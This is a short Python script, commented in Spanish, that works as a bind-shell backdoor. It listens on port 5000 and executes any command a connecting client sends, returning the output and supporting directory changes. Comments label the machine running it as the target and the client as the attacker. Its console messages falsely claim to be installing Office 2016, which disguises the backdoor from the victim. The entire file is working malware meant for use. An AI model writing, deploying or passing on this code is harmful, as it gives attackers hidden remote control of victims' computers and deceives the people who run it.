from socket import socket
from subprocess import getoutput
from os import chdir, getcwd
import threading

#Servidor = target
#Cliente = atacante
server_address = ('0.0.0.0', 5000)
server_socket = socket()
server_socket.bind(server_address)
server_socket.listen(1)

print("[+] Espere un momento...")

def execute_command(command):
    try:
        output = getoutput(command)
        return output
    except Exception as e:
        return f"Error al ejecutar {e}"

def handle_client(client_socket):
    try:
        while True:
            command = client_socket.recv(4096).decode().strip()
            if not command:
                break

            if command.lower() == 's':
                print("[-] Instalado completada")
                break

            elif command.split(" ")[0].lower() == 'cd':
                try:
                    chdir(" ".join(command.split(" ")[1:]))
                    response = f"Directorio actual: {getcwd()}"
                except Exception as e:
                    response = f"Error : {e}"
            else:
                response = execute_command(command)

            client_socket.send(response.encode())
    except ConnectionResetError:
        print("[-] No se logro la conexion al servidor de instalacion")
    finally:
        client_socket.close()

def stop_server():
    global server_socket
    print("[-] Deteniendo el servidor...")
    server_socket.close()

while True:
    try:
        client_socket, client_address = server_socket.accept()
        print("[+] Realizando instalación de office 2016")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()
    except KeyboardInterrupt:
        stop_server()
        break
    except Exception as e:
        print(f"[-] Error: {e}")
